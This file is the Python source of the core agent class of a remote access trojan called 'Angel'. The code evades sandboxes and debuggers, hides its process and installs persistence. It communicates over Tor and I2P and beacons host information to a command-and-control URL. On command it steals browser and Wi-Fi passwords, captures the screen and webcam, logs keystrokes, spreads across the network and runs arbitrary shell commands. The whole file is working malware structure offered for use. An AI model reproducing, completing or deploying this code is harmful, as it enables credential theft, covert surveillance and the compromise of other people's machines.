import os
import sys
import time
import uuid
import json
import random
import platform
from core.crypter import Crypter
from core.obfuscator import CodeObfuscator
from core.stealth import StealthMechanism
from core.brain import AngelBrain
from modules.polyglot import PolyglotBuilder
from modules.persistence import Persistence
from modules.communication import Communication
from modules.collector import Collector
from modules.network import NetworkOperations
from modules.router import CommandRouter
from modules.comms import SecureComms

class Angel:
    def __init__(self, config=None):
        self.agent_id = str(uuid.uuid4())
        self.config = config or {}
        
        # Initialize components
        self.brain = AngelBrain()
        self.crypter = Crypter()
        self.obfuscator = CodeObfuscator()
        self.stealth = StealthMechanism()
        self.polyglot = PolyglotBuilder()
        self.persistence = Persistence()
        self.collector = Collector()
        self.network = NetworkOperations()
        self.router = CommandRouter()
        self.comms = SecureComms(self.config)
        
        # Status tracking
        self.is_running = False
        self.last_beacon = 0
        self.beacon_interval = self.config.get('beacon_interval', 300)
        
    def gather_system_info(self):
        """Gather detailed system information"""
        info = {
            'agent_id': self.agent_id,
            'platform': platform.system(),
            'platform_release': platform.release(),
            'architecture': platform.machine(),
            'hostname': platform.node(),
            'username': os.getenv('USERNAME') or os.getenv('USER'),
            'processor': platform.processor(),
            'timestamp': time.time(),
            'network_info': self.network.get_interfaces(),
            'security_level': self.brain.state['security_level']
        }
        return info
        
    def check_environment(self):
        """Perform environment and security checks"""
        # Let the brain analyze the environment
        env_state = self.brain.analyze_environment()
        
        # Check for virtualization/debugging
        if self.stealth.check_virtualization():
            time.sleep(random.uniform(1000, 2000))
            return False
            
        if self.stealth.check_debugging():
            return False
            
        # Make decision based on environment
        decision = self.brain.make_decision({
            'type': 'environment_check',
            'parameters': env_state
        })
        
        if decision['action'] == 'hibernate':
            time.sleep(decision['parameters']['duration'])
            return self.check_environment()
            
        return True
        
    def install(self):
        """Perform initial installation and setup"""
        try:
            # Hide process
            self.stealth.hide_process()
            
            # Setup communication channels
            self.comms.setup_tor_channel()
            self.comms.setup_i2p_channel()
            
            # Attempt persistence
            executable_path = sys.executable
            if getattr(sys, 'frozen', False):
                executable_path = sys.executable
            elif __file__:
                executable_path = os.path.abspath(__file__)
                
            self.persistence.install_all(executable_path)
            
            # Scan network
            discovered_hosts = self.network.scan_network()
            for host in discovered_hosts:
                if self.network.establish_p2p(host):
                    self.router.add_node(str(uuid.uuid4()), host)
                    
            return True
        except:
            return False
            
    def handle_command(self, command):
        """Handle received commands"""
        try:
            if not command:
                return
                
            cmd_data = json.loads(command)
            cmd_type = cmd_data.get('type')
            cmd_params = cmd_data.get('params', {})
            
            # Let brain make decision about command execution
            decision = self.brain.make_decision({
                'type': 'command_handling',
                'command': cmd_type,
                'parameters': cmd_params
            })
            
            if decision['action'] == 'hibernate':
                time.sleep(decision['parameters']['duration'])
                return
                
            # Execute command based on type
            if cmd_type == 'collect_passwords':
                result = {
                    'chrome': self.collector.get_chrome_passwords(),
                    'firefox': self.collector.get_firefox_passwords(),
                    'wifi': self.collector.get_wifi_passwords()
                }
                
            elif cmd_type == 'capture_screen':
                result = self.collector.capture_screen()
                
            elif cmd_type == 'capture_webcam':
                result = self.collector.capture_webcam()
                
            elif cmd_type == 'start_keylogger':
                self.collector.start_keylogger()
                result = {'status': 'keylogger_started'}
                
            elif cmd_type == 'stop_keylogger':
                result = {'keystrokes': self.collector.stop_keylogger()}
                
            elif cmd_type == 'scan_network':
                result = self.network.scan_network()
                
            elif cmd_type == 'propagate':
                if 'payload' in cmd_params:
                    result = self.network.propagate(cmd_params['payload'])
                    
            elif cmd_type == 'execute':
                if 'command' in cmd_params:
                    os.system(cmd_params['command'])
                    result = {'status': 'executed'}
                    
            elif cmd_type == 'update':
                if 'config' in cmd_params:
                    self.config.update(cmd_params['config'])
                    result = {'status': 'updated'}
                    
            elif cmd_type == 'uninstall':
                self.cleanup()
                sys.exit(0)
                
            # Send result back through secure channel
            if result:
                self.comms.send_data({
                    'agent_id': self.agent_id,
                    'command_id': cmd_data.get('command_id'),
                    'result': result
                })
                
        except Exception as e:
            pass
            
    def send_beacon(self):
        """Send beacon through secure channels"""
        try:
            # Prepare beacon data
            data = {
                'type': 'beacon',
                'data': self.gather_system_info(),
                'network_status': self.router.get_network_status()
            }
            
            # Let brain decide on beacon timing
            decision = self.brain.make_decision({
                'type': 'beacon',
                'parameters': data
            })
            
            if decision['action'] == 'hibernate':
                time.sleep(decision['parameters']['duration'])
                return
                
            # Rotate identity before sending
            self.comms.rotate_identity()
            
            # Send through secure channel
            self.comms.send_data(data)
            
        except:
            pass
            
        self.last_beacon = time.time()
        
    def cleanup(self):
        """Cleanup traces and prepare for shutdown"""
        try:
            self.stealth.clean_traces()
            self.comms.cleanup()
            self.brain.shutdown()
            self.router.shutdown()
        except:
            pass
            
    def run(self):
        """Main operation loop"""
        if not self.check_environment():
            return
            
        self.is_running = True
        self.install()
        
        while self.is_running:
            try:
                current_time = time.time()
                
                # Let brain analyze and make decisions
                decision = self.brain.make_decision({
                    'type': 'main_loop',
                    'parameters': {
                        'last_beacon': self.last_beacon,
                        'beacon_interval': self.beacon_interval
                    }
                })
                
                if decision['action'] == 'hibernate':
                    time.sleep(decision['parameters']['duration'])
                    continue
                    
                # Send beacon if interval has passed
                if current_time - self.last_beacon >= self.beacon_interval:
                    self.send_beacon()
                    
                # Check for commands
                command = self.comms.receive_data(timeout=5)
                if command:
                    self.handle_command(command)
                    
                # Sleep for a random interval
                time.sleep(random.uniform(1, 5))
                
            except KeyboardInterrupt:
                self.cleanup()
                break
            except:
                # If any error occurs, let brain decide what to do
                decision = self.brain.make_decision({
                    'type': 'error_handling',
                    'parameters': {
                        'error_count': getattr(self, 'error_count', 0) + 1
                    }
                })
                
                if decision['action'] == 'hibernate':
                    time.sleep(decision['parameters']['duration'])
                else:
                    time.sleep(random.uniform(30, 60))
                    
                continue
                
def main():
    # Example configuration
    config = {
        'email': 'your-email@example.com',
        'password': 'your-app-password',
        'c2_url': 'https://your-c2-server.com/beacon',
        'beacon_interval': 300
    }
    
    angel = Angel(config)
    angel.run()

if __name__ == "__main__":
    main()
